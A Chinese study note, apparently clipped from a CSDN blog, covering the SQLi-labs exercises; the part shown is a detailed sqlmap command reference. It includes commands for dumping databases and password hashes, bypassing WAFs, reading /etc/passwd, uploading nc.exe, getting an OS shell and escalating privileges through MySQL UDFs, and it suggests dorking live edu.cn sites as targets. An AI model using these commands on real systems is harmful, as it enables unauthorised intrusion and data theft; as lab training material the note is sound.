---
date: 2022-06-28-星期二 08:56:21
update: 
tags: [time/year2022,time/month06,网络安全/web安全/slqInjection]
id: 20220628085621
---



# SQL-labs通关合集及知识总结

[blog.csdn.net](https://blog.csdn.net/qq_45584159/article/details/111054882)

SQL-labs通关合集及知识总结-
-

### 文章目录

*   sqlmap的使用和常用命令：
*   *   1#、注入六连：
    *   2#、COOKIE注入：
    *   3#、POST注入：
    *   4#、常用指令：
*   SQLmap的详细使用：
*   *   1.3.2 目标
    *   1.3.3 请求
    *   1.3.4 优化
    *   1.3.5 注入
    *   1.3.6 检测
    *   1.3.7 技巧
    *   1.3.8 指纹
    *   1.3.9 枚举
    *   1.3.10 暴力
    *   1.3.11 用户自定义函数注入
    *   1.3.12 访问文件系统
    *   1.3.14 Windows注册表访问
    *   1.3.15 一般选项
    *   1.3.16 其他
    *   1.4 实际利用
    *   *   1.4.1 检测和利用SQL注入
        *   1.4.2 直接连接数据库
        *   1.4.3数据库相关操作
    *   1.5 SQLMAP实用技巧
    *   *   1\. mysql的注释方法进行绕过WAF进行SQL注入
        *   2\. URL重写SQL注入测试
        *   3\. 列举并破解密码哈希值
        *   4\. 获取表中的数据个数
        *   5.对网站secbang.com进行漏洞爬去
        *   6.基于布尔SQL注入预估时间
        *   7.使用hex避免字符编码导致数据丢失
        *   8.模拟测试手机环境站点
        *   9.智能判断测试
        *   12.读取linux下文件
        *   13.延时注入
        *   16.mysql提权
        *   17.执行shell命令
        *   18.延时注入
    *   sqlmap的注入实例：
    *   burp suite支持从不同的文件中读取目标进行SQL注入探测：
    *   Google Hacking注入
    *   post注入：
    *   cookie注入：
    *   user-agent注入：
    *   HTTP host头注入：
    *   sqlmap设置代理：
    *   设置Tor网络：
    *   设置具体的参数：
    *   设置Temper脚本
    *   SQL注入常用的过waf技巧：
*   一、base challenge
*   *   SQL注入基本知识：

*   *   在进行时间盲注时，会用到的一些函数：
    *   less-1
    *   *   联合查询
        *   报错注入：
        *   布尔盲注：
        *   基于时间的盲注
        *   sqlmap：
    *   Less-2
    *   less-3
    *   less-4
    *   Less-5
    *   Less-6
    *   less-7
    *   Less-8
    *   Less-9
    *   Less-10
    *   less-11(post)
    *   *   联合注入：
        *   报错注入：
        *   sqlmap：
    *   Less-12
    *   Less-13
    *   Less-14
    *   Less-15
    *   Less-16
    *   less-17:
    *   Less-19
    *   Less-20
    *   Less-21
    *   Less-22
*   高级注入
*   *   绕过去除注释符：Less-23
    *   绕过去除and和or的SQL注入：less-25
    *   二次注入:less-24
    *   Less-25a
    *   less-26
    *   Less-26a
    *   less-27
    *   Less-28
    *   Less-28a
    *   Less-27a
    *   less-29
    *   less-30
    *   Less-31
    *   Less-32
    *   *   宽字节注入的原理：
    *   less-33
    *   less-34
    *   less-35
    *   less-36
    *   less-37
*   叠加注入
*   *   less-38
    *   Less-39
    *   Less-40
    *   Less-41
    *   less-42
    *   Less-43
    *   Less-44
    *   Less-45
*   order by 注入
*   *   Less-46
    *   Less-47
    *   Less-48
    *   Less-49
    *   Less-50
    *   Less-51
    *   Less-52
    *   Less-53
*   challenge
*   *   less-54

* * *

## sqlmap的使用和常用命令：

使用technique参数可以指定使用什么技术探测，默认是所有技术。-
B-布尔，T-时间，s-堆叠查询，u-union探测，E-基于报错的

## 1#、注入六连：

1.  sqlmap -u “http://www.xx.com?id=x” 【查询是否存在注入点
    
2.      --dbs         【检测站点包含哪些数据库
        
              
3.      --current-db    【获取当前的数据库名
        
              
4.      --tables -D "db_name"  【获取指定数据库中的表名 -D后接指定的数据库名称
        
              
5.      --columns  -T "table_name" -D "db_name"  【获取数据库表中的字段
        
              
6.      --dump -C "columns_name" -T "table_name" -D "db_name"  【获取字段的数据内容
        
              

## 2#、COOKIE注入：

sqlmap -u “http://www.xx.com?id=x” --cookie “cookie” --level 2 【cookie注入 后接cookie值

## 3#、POST注入：

（1）目标地址http:// www.xxx.com /login.asp-
（2）打开brup代理。-
（3）点击表单提交-
（4）burp获取拦截信息（post）-
（5）右键保存文件（.txt）到指定目录下-
（6）运行sqlmap并执行如下命令：-
用例：sqlmap -r okay.txt -p username

// -r表示加载文件(及步骤（5）保存的路径)，-p指定参数（即拦截的post请求中表单提交的用户名或密码等name参数）

（7）自动获取表单：–forms自动获取表单

例如：sqlmap -u www.xx.com/login.asp --forms

（8）指定参数搜索：–data

例如:sqlmap -u www.xx.com/login.asp --data “username=1”

## 4#、常用指令：

1.  –purge 【重新扫描（–purge 删除原先对该目标扫描的记录）
    
2.  –tables 【获取表名
    
3.      --dbs         【检测站点包含哪些数据库
        
              
4.      --current-db    【获取当前的数据库名
        
              
5.      --current-user  【检测当前用户
        
              
6.  –is-dba 【判断站点的当前用户是否为数据库管理员
    
7.  –batch 【默认确认，不询问你是否输入
    
8.  –search 【后面跟参数 -D -T -C 搜索列（C），表（T）和或数据库名称（D）
    
9.  –threads 10 【线程，sqlmap线程最高设置为10
    
10.  –level 3 【sqlmap默认测试所有的GET和POST参数，当–level的值大于等于2的时候也会测试HTTP Cookie头-
    的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。最高为5
    
11.  –risk 3 【执行测试的风险（0-3，默认为1）risk越高，越慢但是越安全
    
12.      -v   【详细的等级(0-6)
          0：只显示Python的回溯，错误和关键消息。
          1：显示信息和警告消息。
          2：显示调试消息。
          3：有效载荷注入。
          4：显示HTTP请求。
          5：显示HTTP响应头。
          6：显示HTTP响应页面的内容
        
              
13.  –privileges 【查看权限
    
14.  –tamper xx.py,cc.py 【防火墙绕过，后接tamper库中的py文件
    
15.  –method “POST” --data “page=1&id=2” 【POST方式提交数据
    
16.  –threads number　　【采用多线程 后接线程数
    
17.  –referer “” 【使用referer欺骗
    
18.  –user-agent “” 【自定义user-agent
    
19.  –proxy “目标地址″ 【使用代理注入
    

## SQLmap的详细使用：

## 1.3.2 目标

在这些选项中必须提供至少有一个确定目标

     -d DIRECT    直接连接数据库的连接字符串
    
    -u URL, --url=URL   目标URL (e.g."http://www.site.com/vuln.php?id=1")，使用-u或者--url 
    
    -l LOGFILE     从Burp或者WebScarab代理日志文件中分析目标
    
    -x SITEMAPURL  从远程网站地图（sitemap.xml）文件来解析目标
    
    -m BULKFILE      将目标地址保存在文件中，一行为一个URL地址进行批量检测。
    
    -r REQUESTFILE   从文件加载HTTP请求，sqlmap可以从一个文本文件中获取HTTP请求，这样就可以跳过设置一些其他参数（比如cookie，POST数据，等等），请求是HTTPS的时需要配合这个--force-ssl参数来使用，或者可以在Host头后门加上:443
    
    -g GOOGLEDORK     从谷歌中加载结果目标URL（只获取前100个结果，需要挂代理）
    
    -c CONFIGFILE       从配置ini文件中加载选项
    
        

## 1.3.3 请求

    这些选项可以用来指定如何连接到目标URL
    
    --method=METHOD  强制使用给定的HTTP方法（例如put）
    
        --data=DATA   通过POST发送数据参数，sqlmap会像检测GET参数一样检测POST的参数。--data="id=1" -f --banner --dbs --users
       --param-del=PARA..  当GET或POST的数据需要用其他字符分割测试参数的时候需要用到此参数。
    
       --cookie=COOKIE     HTTP Cookieheader 值
    
       --cookie-del=COO..  用来分隔cookie的字符串值
    
       --load-cookies=L..  Filecontaining cookies in Netscape/wget format
    
       --drop-set-cookie   IgnoreSet-Cookie header from response
    
       --user-agent=AGENT  默认情况下sqlmap的HTTP请求头中User-Agent值是：sqlmap/1.0-dev-xxxxxxx(http://sqlmap.org)可以使用--user-agent参数来修改，同时也可以使用--random-agent参数来随机的从./txt/user-agents.txt中获取。当--level参数设定为3或者3以上的时候，会尝试对User-Angent进行注入
    
       --random-agent     使用random-agent作为HTTP User-Agent头值
    
       --host=HOST         HTTP Hostheader value
    
       --referer=REFERER   sqlmap可以在请求中伪造HTTP中的referer，当--level参数设定为3或者3以上的时候会尝试对referer注入
    
       -H HEADER, --hea..  额外的http头(e.g."X-Forwarded-For: 127.0.0.1")
    
       --headers=HEADERS  可以通过--headers参数来增加额外的http头(e.g."Accept-Language: fr\nETag: 123")
    
       --auth-type=AUTH.. HTTP的认证类型 (Basic, Digest, NTLM or PKI)
    
       --auth-cred=AUTH..  HTTP 认证凭证(name:password)
    
       --auth-file=AUTH..  HTTP 认证PEM证书/私钥文件；当Web服务器需要客户端证书进行身份验证时，需要提供两个文件:key_file，cert_file,key_file是格式为PEM文件，包含着你的私钥，cert_file是格式为PEM的连接文件。
    
       --ignore-401        Ignore HTTPError 401 (Unauthorized)忽略HTTP 401错误（未授权的）
    
       --ignore-proxy      忽略系统的默认代理设置
    
       --ignore-redirects忽略重定向的尝试
    
       --ignore-timeouts   忽略连接超时
    
       --proxy=PROXY       使用代理服务器连接到目标URL
    
       --proxy-cred=PRO..  代理认证凭证(name:password)
    
       --proxy-file=PRO..  从文件加载代理列表
    
       --tor               使用Tor匿名网络
    
       --tor-port=TORPORT  设置Tor代理端口
    
       --tor-type=TORTYPE  设置Tor代理类型 (HTTP,SOCKS4 or SOCKS5 (缺省))
    
       --check-tor       检查Tor的是否正确使用
    
       --delay=DELAY   可以设定两个HTTP(S)请求间的延迟，设定为0.5的时候是半秒，默认是没有延迟的。
    
       --timeout=TIMEOUT   可以设定一个HTTP(S)请求超过多久判定为超时，10表示10秒，默认是30秒。
    
       --retries=RETRIES   当HTTP(S)超时时，可以设定重新尝试连接次数，默认是3次。
    
       --randomize=RPARAM可以设定某一个参数值在每一次请求中随机的变化，长度和类型会与提供的初始值一样
    
       --safe-url=SAFEURL  提供一个安全不错误的连接，每隔一段时间都会去访问一下
    
       --safe-post=SAFE..  提供一个安全不错误的连接，每次测试请求之后都会再访问一遍安全连接。
    
       --safe-req=SAFER..  从文件中加载安全HTTP请求
    
       --safe-freq=SAFE..  测试一个给定安全网址的两个访问请求
    
       --skip-urlencode    跳过URL的有效载荷数据编码
    
       --csrf-token=CSR..  Parameter usedto hold anti-CSRF token参数用来保存反CSRF令牌
    
       --csrf-url=CSRFURL  URL地址访问提取anti-CSRF令牌
    
       --force-ssl         强制使用SSL/HTTPS
    
       --hpp               使用HTTP参数污染的方法
    
       --eval=EVALCODE     在有些时候，需要根据某个参数的变化，而修改另个一参数，才能形成正常的请求，这时可以用--eval参数在每次请求时根据所写python代码做完修改后请求。(e.g "import hashlib;id2=hashlib.md5(id).hexdigest()")
    
     sqlmap.py -u"http://www.target.com/vuln.php?id=1&hash=c4ca4238a0b923820dcc509a6f75849b"--eval="import hashlib;hash=hashlib.md5(id).hexdigest()"
    
        

## 1.3.4 优化

    这些选项可用于优化sqlmap性能
    
    -o               打开所有的优化开关
    
    --predict-output    预测普通查询输出
    
    --keep-alive        使用持久HTTP（S）连接
    
    --null-connection   获取页面长度
    
    --threads=THREADS   当前http(s)最大请求数 (默认 1)
    
        

## 1.3.5 注入

    这些选项可用于指定要测试的参数、提供自定义注入有效载荷和可选的篡改脚本。
    
       -p TESTPARAMETER    可测试的参数
    
       --skip=SKIP         跳过对给定参数的测试
    
       --skip-static       跳过测试不显示为动态的参数
    
       --param-exclude=..  使用正则表达式排除参数进行测试（e.g. "ses"）
    
       --dbms=DBMS         强制后端的DBMS为此值
    
       --dbms-cred=DBMS..  DBMS认证凭证(user:password)
    
       --os=OS            强制后端的DBMS操作系统为这个值
    
       --invalid-bignum    使用大数字使值无效
    
       --invalid-logical   使用逻辑操作使值无效
    
       --invalid-string    使用随机字符串使值无效
    
       --no-cast          关闭有效载荷铸造机制
    
       --no-escape         关闭字符串逃逸机制
    
       --prefix=PREFIX     注入payload字符串前缀
    
       --suffix=SUFFIX     注入payload字符串后缀
    
       --tamper=TAMPER   使用给定的脚本篡改注入数据
    
        

## 1.3.6 检测

    这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容
    
       --level=LEVEL     执行测试的等级（1-5，默认为1）
    
       --risk=RISK       执行测试的风险（0-3，默认为1）
    
       --string=STRING    查询时有效时在页面匹配字符串
    
       --not-string=NOT..  当查询求值为无效时匹配的字符串
    
       --regexp=REGEXP     查询时有效时在页面匹配正则表达式
    
       --code=CODE       当查询求值为True时匹配的HTTP代码
    
       --text-only        仅基于在文本内容比较网页
    
       --titles           仅根据他们的标题进行比较
    
        

## 1.3.7 技巧

    这些选项可用于调整具体的SQL注入测试
    
       --technique=TECH    SQL注入技术测试（默认BEUST）
    
       --time-sec=TIMESEC  DBMS响应的延迟时间（默认为5秒）
    
       --union-cols=UCOLS  定列范围用于测试UNION查询注入
    
       --union-char=UCHAR  暴力猜测列的字符数
    
       --union-from=UFROM  SQL注入UNION查询使用的格式
    
       --dns-domain=DNS..  DNS泄露攻击使用的域名
    
       --second-order=S..  URL搜索产生的结果页面
    
        

## 1.3.8 指纹

    f, --fingerprint   执行广泛的DBMS版本指纹检查
    
        

## 1.3.9 枚举

    这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行自定义的SQL语句。
    
       -a, --all           获取所有信息
    
       -b, --banner        获取数据库管理系统的标识
    
       --current-user      获取数据库管理系统当前用户
    
       --current-db        获取数据库管理系统当前数据库
    
        --hostname         获取数据库服务器的主机名称
    
       --is-dba            检测DBMS当前用户是否DBA
    
       --users             枚举数据库管理系统用户
    
       --passwords         枚举数据库管理系统用户密码哈希
    
       --privileges        枚举数据库管理系统用户的权限
    
       --roles            枚举数据库管理系统用户的角色
    
       --dbs             枚举数据库管理系统数据库
    
       --tables            枚举的DBMS数据库中的表
    
       --columns          枚举DBMS数据库表列
    
       --schema            枚举数据库架构
    
       --count             检索表的项目数，有时候用户只想获取表中的数据个数而不是具体的内容，那么就可以使用这个参数：sqlmap.py -u url --count -D testdb
    
       --dump            转储数据库表项
    
        --dump-all          转储数据库所有表项
    
       --search           搜索列（S），表（S）和/或数据库名称（S）
    
       --comments          获取DBMS注释
    
       -D DB               要进行枚举的指定数据库名
    
       -T TBL              DBMS数据库表枚举
    
       -C COL             DBMS数据库表列枚举
    
       -X EXCLUDECOL     DBMS数据库表不进行枚举
    
       -U USER           用来进行枚举的数据库用户
    
       --exclude-sysdbs    枚举表时排除系统数据库
    
       --pivot-column=P..  Pivot columnname
    
       --where=DUMPWHERE   Use WHEREcondition while table dumping
    
       --start=LIMITSTART  获取第一个查询输出数据位置
    
       --stop=LIMITSTOP   获取最后查询的输出数据
    
       --first=FIRSTCHAR   第一个查询输出字的字符获取
    
       --last=LASTCHAR    最后查询的输出字字符获取
    
       --sql-query=QUERY   要执行的SQL语句
    
       --sql-shell         提示交互式SQL的shell
    
       --sql-file=SQLFILE  要执行的SQL文件
    
        

## 1.3.10 暴力

    这些选项可以被用来运行暴力检查
    
       --common-tables     检查存在共同表
    
       --common-columns    检查存在共同列
    
        

## 1.3.11 用户自定义函数注入

    这些选项可以用来创建用户自定义函数
    
       --udf-inject    注入用户自定义函数
    
       --shared-lib=SHLIB  共享库的本地路径
    
        

## 1.3.12 访问文件系统

    这些选项可以被用来访问后端数据库管理系统的底层文件系统
    
       --file-read=RFILE   从后端的数据库管理系统文件系统读取文件，SQL Server2005中读取二进制文件example.exe:
    
    sqlmap.py -u"http://192.168.136.129/sqlmap/mssql/iis/get_str2.asp?name=luther"--file-read "C:/example.exe" -v 1
    
       --file-write=WFILE  编辑后端的数据库管理系统文件系统上的本地文件
    
       --file-dest=DFILE   后端的数据库管理系统写入文件的绝对路径
    
    在kali中将/software/nc.exe文件上传到C:/WINDOWS/Temp下：
    
    python sqlmap.py -u"http://192.168.136.129/sqlmap/mysql/get_int.aspx?id=1" --file-write"/software/nc.exe" --file-dest "C:/WINDOWS/Temp/nc.exe" -v1
    
    ## 1.3.13 操作系统访问
    
    这些选项可以用于访问后端数据库管理系统的底层操作系统
    
       --os-cmd=OSCMD   执行操作系统命令（OSCMD）
    
       --os-shell          交互式的操作系统的shell
    
       --os-pwn          获取一个OOB shell，meterpreter或VNC
    
       --os-smbrelay       一键获取一个OOBshell，meterpreter或VNC
    
       --os-bof           存储过程缓冲区溢出利用
    
       --priv-esc          数据库进程用户权限提升
    
       --msf-path=MSFPATH  MetasploitFramework本地的安装路径
    
       --tmp-path=TMPPATH  远程临时文件目录的绝对路径
    
    linux查看当前用户命令：
    
    sqlmap.py -u"http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1" --os-cmd id -v1
    
        

## 1.3.14 Windows注册表访问

    这些选项可以被用来访问后端数据库管理系统Windows注册表
    
       --reg-read          读一个Windows注册表项值
    
       --reg-add           写一个Windows注册表项值数据
    
       --reg-del           删除Windows注册表键值
    
       --reg-key=REGKEY    Windows注册表键
    
       --reg-value=REGVAL  Windows注册表项值
    
       --reg-data=REGDATA  Windows注册表键值数据
    
       --reg-type=REGTYPE  Windows注册表项值类型
    
        

## 1.3.15 一般选项

    这些选项可以用来设置一些一般的工作参数
    
       -s SESSIONFILE     保存和恢复检索会话文件的所有数据
    
       -t TRAFFICFILE      记录所有HTTP流量到一个文本文件中
    
       --batch            从不询问用户输入，使用所有默认配置。
    
       --binary-fields=..  结果字段具有二进制值(e.g."digest")
    
       --charset=CHARSET   强制字符编码
    
       --crawl=CRAWLDEPTH  从目标URL爬行网站
    
       --crawl-exclude=..  正则表达式从爬行页中排除
    
       --csv-del=CSVDEL    限定使用CSV输出 (default",")
    
       --dump-format=DU..  转储数据格式(CSV(default), HTML or SQLITE)
    
       --eta              显示每个输出的预计到达时间
    
       --flush-session     刷新当前目标的会话文件
    
       --forms           解析和测试目标URL表单
    
        --fresh-queries     忽略在会话文件中存储的查询结果
    
       --hex             使用DBMS Hex函数数据检索
    
       --output-dir=OUT..  自定义输出目录路径
    
       --parse-errors      解析和显示响应数据库错误信息
    
       --save=SAVECONFIG   保存选项到INI配置文件
    
       --scope=SCOPE    从提供的代理日志中使用正则表达式过滤目标
    
       --test-filter=TE..  选择测试的有效载荷和/或标题(e.g. ROW)
    
       --test-skip=TEST..  跳过试验载荷和/或标题(e.g.BENCHMARK)
    
       --update            更新sqlmap
    
        

## 1.3.16 其他

       -z MNEMONICS        使用短记忆法 (e.g."flu,bat,ban,tec=EU")
    
       --alert=ALERT       发现SQL注入时，运行主机操作系统命令
    
       --answers=ANSWERS   当希望sqlmap提出输入时，自动输入自己想要的答案(e.g. "quit=N,follow=N")，例如：sqlmap.py -u"http://192.168.22.128/get_int.php?id=1"--technique=E--answers="extending=N"    --batch
    
       --beep    发现sql注入时，发出蜂鸣声。
    
       --cleanup     清除sqlmap注入时在DBMS中产生的udf与表。
    
       --dependencies      Check formissing (non-core) sqlmap dependencies
    
       --disable-coloring  默认彩色输出，禁掉彩色输出。
    
       --gpage=GOOGLEPAGE 使用前100个URL地址作为注入测试，结合此选项，可以指定页面的URL测试
    
       --identify-waf      进行WAF/IPS/IDS保护测试，目前大约支持30种产品的识别
    
       --mobile     有时服务端只接收移动端的访问，此时可以设定一个手机的User-Agent来模仿手机登陆。
    
       --offline           Work inoffline mode (only use session data)
    
       --purge-output     从输出目录安全删除所有内容，有时需要删除结果文件，而不被恢复，可以使用此参数，原有文件将会被随机的一些文件覆盖。
    
       --skip-waf           跳过WAF／IPS / IDS启发式检测保护
    
       --smart            进行积极的启发式测试，快速判断为注入的报错点进行注入
    
       --sqlmap-shell      互动提示一个sqlmapshell
    
       --tmp-dir=TMPDIR    用于存储临时文件的本地目录
    
       --web-root=WEBROOT  Web服务器的文档根目录(e.g."/var/www")
    
       --wizard   新手用户简单的向导使用，可以一步一步教你如何输入针对目标注入
    
        

## 1.4 实际利用

### 1.4.1 检测和利用[SQL注入](https://so.csdn.net/so/search?q=SQL%E6%B3%A8%E5%85%A5&spm=1001.2101.3001.7020)

    1.手工判断是否存在漏洞
    
    对动态网页进行安全审计，通过接受动态用户提供的GET、POST、Cookie参数值、User-Agent请求头。
    
    原始网页：http://192.168.136.131/sqlmap/mysql/get_int.php?id=1
    
    构造url1：http://192.168.136.131/sqlmap/mysql/get_int.php?id=1+AND+1=1
    
    构造url2：http://192.168.136.131/sqlmap/mysql/get_int.php?id=1+AND+1=2
    
    如果url1访问结果跟原始网页一致，而url2跟原始网页不一致，有出错信息或者显示内容不一致，则证明存在SQL注入。
    
    2. sqlmap自动检测
    
    检测语法：sqlmap.py -u http://192.168.136.131/sqlmap/mysql/get_int.php?id=1
    
    技巧：在实际检测过程中，sqlmap会不停的询问，需要手工输入Y/N来进行下一步操作，可以使用参数“--batch”命令来自动答复和判断。
    
    3. 寻找和判断实例
    
    通过百度对“inurl:news.asp?id=site:edu.cn”、“inurl:news.php?id= site:edu.cn”、“inurl:news.aspx?id=site:edu.cn”进行搜索，搜索news.php/asp/aspx，站点为edu.cn，如图1所示。随机打开一个网页搜索结果，如图2所示，如果能够正常访问，则复制该URL地址。
    
    超详细SQLMap使用攻略及技巧
    
    图1搜索目标
    
    图2测试网页能否正常访问.jpg
    
    图2测试网页能否正常访问
    
      将该url使用sqlmap进行注入测试，如图3所示，测试结果可能存在SQL注入，也可能不存在SQL注入，存在则可以进行数据库名称，数据库表以及数据的操作。本例中是不存在SQL注入漏洞。
    
    图3检测URL地址是否存在漏洞.jpg
    
    图3检测URL地址是否存在漏洞
    
    4. 批量检测
    
    将目标url搜集并整理为txt文件，如图4所示，所有文件都保存为tg.txt，然后使用“sqlmap.py-m tg.txt”，注意tg.txt跟sqlmap在同一个目录下。
    
    图4批量整理目标地址.jpg
    
    图4批量整理目标地址
    
        

### 1.4.2 直接连接数据库

    sqlmap.py -d"mysql://admin:admin@192.168.21.17:3306/testdb" -f --banner --dbs--users
    
        

### 1.4.3数据库相关操作

    1.列数据库信息：--dbs
    
    2.web当前使用的数据库--current-db
    
    3.web数据库使用账户--current-user
    
    4.列出sqlserver所有用户 --users
    
    5.数据库账户与密码 --passwords
    
    6.指定库名列出所有表  -D database --tables
    
    -D：指定数据库名称
    
    7.指定库名表名列出所有字段 -D antian365-T admin --columns
    
    -T：指定要列出字段的表
    
    8.指定库名表名字段dump出指定字段
    
    -D secbang_com -T admin -C  id,password ,username --dump
    
    -D antian365 -T userb -C"email,Username,userpassword" --dump
    
      可加双引号，也可不加双引号。
    
    9.导出多少条数据
    
    -D tourdata -T userb -C"email,Username,userpassword" --start 1 --stop 10 --dump 
    
    参数：
    
    --start：指定开始的行
    
    --stop：指定结束的行
    
    此条命令的含义为：导出数据库tourdata中的表userb中的字段(email,Username,userpassword)中的第1到第10行的数据内容。
    
        

## 1.5 SQLMAP实用技巧

### 1\. mysql的注释方法进行绕过WAF进行SQL注入

    （1）修改C:\Python27\sqlmap\tamper\halfversionedmorekeywords.py
    
    return match.group().replace(word,"/*!0%s" % word) 为：
    
    return match.group().replace(word,"/*!50000%s*/" % word)
    
    （2）修改C:\Python27\sqlmap\xml\queries.xml
    
    <cast query="CAST(%s ASCHAR)"/>为：
    
    <castquery="convert(%s,CHAR)"/>
    
    （3）使用sqlmap进行注入测试
    
    sqlmap.py -u"http://**.com/detail.php? id=16" –tamper "halfversionedmorekeywords.py"
    
    其它绕过waf脚本方法：
    
    sqlmap.py-u "http://192.168.136.131/sqlmap/mysql/get_int.php?id=1" --tampertamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3
    
    （4）tamper目录下文件具体含义：
    
    space2comment.py用/**/代替空格
    
    apostrophemask.py用utf8代替引号
    
    equaltolike.pylike代替等号
    
    space2dash.py　绕过过滤‘=’ 替换空格字符（”），（’–‘）后跟一个破折号注释，一个随机字符串和一个新行（’n’）
    
    greatest.py　绕过过滤’>’ ,用GREATEST替换大于号。
    
    space2hash.py空格替换为#号,随机字符串以及换行符
    
    apostrophenullencode.py绕过过滤双引号，替换字符和双引号。
    
    halfversionedmorekeywords.py当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论
    
    space2morehash.py空格替换为 #号 以及更多随机字符串 换行符
    
    appendnullbyte.py在有效负荷结束位置加载零字节字符编码
    
    ifnull2ifisnull.py　绕过对IFNULL过滤,替换类似’IFNULL(A,B)’为’IF(ISNULL(A), B, A)’
    
    space2mssqlblank.py(mssql)空格替换为其它空符号
    
    base64encode.py　用base64编码替换
    
    space2mssqlhash.py　替换空格
    
    modsecurityversioned.py过滤空格，包含完整的查询版本注释
    
    space2mysqlblank.py　空格替换其它空白符号(mysql)
    
    between.py用between替换大于号（>）
    
    space2mysqldash.py替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）
    
    multiplespaces.py围绕SQL关键字添加多个空格
    
    space2plus.py用+替换空格
    
    bluecoat.py代替空格字符后与一个有效的随机空白字符的SQL语句,然后替换=为like
    
    nonrecursivereplacement.py双重查询语句,取代SQL关键字
    
    space2randomblank.py代替空格字符（“”）从一个随机的空白字符可选字符的有效集
    
    sp_password.py追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾
    
    chardoubleencode.py双url编码(不处理以编码的)
    
    unionalltounion.py替换UNION ALLSELECT UNION SELECT
    
    charencode.py　url编码
    
    randomcase.py随机大小写
    
    unmagicquotes.py宽字符绕过 GPCaddslashes
    
    randomcomments.py用/**/分割sql关键字
    
    charunicodeencode.py字符串 unicode 编码
    
    securesphere.py追加特制的字符串
    
    versionedmorekeywords.py注释绕过
    
    space2comment.py替换空格字符串(‘‘) 使用注释‘/**/’
    
    halfversionedmorekeywords.py关键字前加注释
    
        

### 2\. URL重写SQL注入测试

    value1为测试参数，加“*”即可，sqlmap将会测试value1的位置是否可注入。
    
    sqlmap.py -u"http://targeturl/param1/value1*/param2/value2/"
    
        

### 3\. 列举并破解密码哈希值

      当前用户有权限读取包含用户密码的权限时，sqlmap会现列举出用户，然后列出hash，并尝试破解。
    
    sqlmap.py -u"http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1" --passwords -v1
    
        

### 4\. 获取表中的数据个数

    sqlmap.py -u"http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1" --count -Dtestdb
    
        

### 5.对网站secbang.com进行漏洞爬去

    sqlmap.py -u "http://www.secbang.com"--batch --crawl=3
    
        

### 6.基于布尔SQL注入预估时间

    sqlmap.py -u "http://192.168.136.131/sqlmap/oracle/get_int_bool.php?id=1"-b --eta
    
        

### 7.使用hex避免字符编码导致数据丢失

    sqlmap.py -u "http://192.168.48.130/pgsql/get_int.php?id=1" --banner --hex -v 3 --parse-errors
    
        

### 8.模拟测试手机环境站点

    python sqlmap.py -u"http://www.target.com/vuln.php?id=1" --mobile
    
        

### 9.智能判断测试

    sqlmap.py -u "http://www.antian365.com/info.php?id=1"--batch --smart
    
    ### 10.结合burpsuite进行注入
    
    （1）burpsuite抓包，需要设置burpsuite记录请求日志
    
    sqlmap.py -r burpsuite抓包.txt
    
    （2）指定表单注入
    
    sqlmap.py -u URL --data“username=a&password=a”
    
    ### 11.sqlmap自动填写表单注入
    
    自动填写表单：
    
    sqlmap.py -u URL --forms 
    
    sqlmap.py -u URL --forms --dbs
    
    sqlmap.py -u URL --forms --current-db
    
    sqlmap.py -u URL --forms -D 数据库名称--tables
    
    sqlmap.py -u URL --forms -D 数据库名称 -T 表名 --columns
    
    sqlmap.py -u URL --forms -D 数据库名称 -T 表名 -Cusername，password --dump
    
        

### 12.读取linux下文件

     sqlmap.py-u "url" --file /etc/password
    
        

### 13.延时注入

    sqlmap.py -u URL --technique -T--current-user
    
    ### 14. sqlmap 结合burpsuite进行post注入
    
    结合burpsuite来使用sqlmap：
    
    （1）浏览器打开目标地址http://www.antian365.com
    
    （2）配置burp代理(127.0.0.1:8080)以拦截请求
    
    （3）点击登录表单的submit按钮
    
    （4）Burp会拦截到了我们的登录POST请求
    
    （5）把这个post请求复制为txt, 我这命名为post.txt 然后把它放至sqlmap目录下
    
    （6）运行sqlmap并使用如下命令：
    
    ./sqlmap.py -r post.txt -p tfUPass
    
    ### 15.sqlmap cookies注入
    
    sqlmap.py -u "http://127.0.0.1/base.PHP"–cookies "id=1"  –dbs –level 2
    
    默认情况下SQLMAP只支持GET/POST参数的注入测试，但是当使用–level 参数且数值>=2的时候也会检查cookie里面的参数，当>=3的时候将检查User-agent和Referer。可以通过burpsuite等工具获取当前的cookie值，然后进行注入：
    
    sqlmap.py -u 注入点URL --cookie"id=xx" --level 3
    
    sqlmap.py -u url --cookie "id=xx"--level 3 --tables(猜表名)
    
    sqlmap.py -u url --cookie "id=xx"--level 3 -T 表名 --coiumns
    
    sqlmap.py -u url --cookie "id=xx"--level 3 -T 表名 -C username，password --dump
    
        

### 16.mysql提权

    （1）连接mysql数据打开一个交互shell:
    
    sqlmap.py -dmysql://root:root@127.0.0.1:3306/test --sql-shell
    
    select @@version;
    
    select @@plugin_dir;
    
    d:\\wamp2.5\\bin\\mysql\\mysql5.6.17\\lib\\plugin\\
    
    （2）利用sqlmap上传lib_mysqludf_sys到MySQL插件目录:
    
    sqlmap.py -dmysql://root:root@127.0.0.1:3306/test --file-write=d:/tmp/lib_mysqludf_sys.dll--file-dest=d:\\wamp2.5\\bin\\mysql\\mysql5.6.17\\lib\\plugin\\lib_mysqludf_sys.dll
    
    CREATE FUNCTION sys_exec RETURNS STRINGSONAME 'lib_mysqludf_sys.dll'
    
    CREATE FUNCTION sys_eval RETURNS STRINGSONAME 'lib_mysqludf_sys.dll'
    
    select sys_eval('ver'); 
    
        

### 17.执行shell命令

    sqlmap.py -u "url" –os-cmd="netuser" /*执行net user命令*/
    
    sqlmap.py -u "url" –os-shell /*系统交互的shell*/
    
        

### 18.延时注入

    sqlmap –dbs -u"url" –delay 0.5 /*延时0.5秒*/
    
    sqlmap –dbs -u"url" –safe-freq /*请求2次*/
    
        

参考文章：

[https://www.freebuf.com/sectool/164608.html](https://www.freebuf.com/sectool/164608.html)

## sqlmap的注入实例：

## burp suite支持从不同的文件中读取目标进行SQL注入探测：

件-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20201216230240772.png)-
eg：-
